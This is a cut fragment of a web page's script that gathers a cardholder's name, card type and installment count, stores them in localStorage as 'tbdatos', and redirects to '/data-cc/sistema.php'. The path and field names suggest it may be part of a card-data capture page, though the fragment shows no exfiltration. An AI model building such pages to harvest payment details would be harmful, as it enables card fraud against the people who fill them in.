                ownerName: document.getElementById('ownerName').value.trim(),
                tipo_tarjeta: tipoTarjeta,
                cuotas
            };
            
            localStorage.setItem('tbdatos', JSON.stringify(tbdatosActualizado));
            window.location.href = '/data-cc/sistema.php';
        });
    </script>
    </body>
    </html>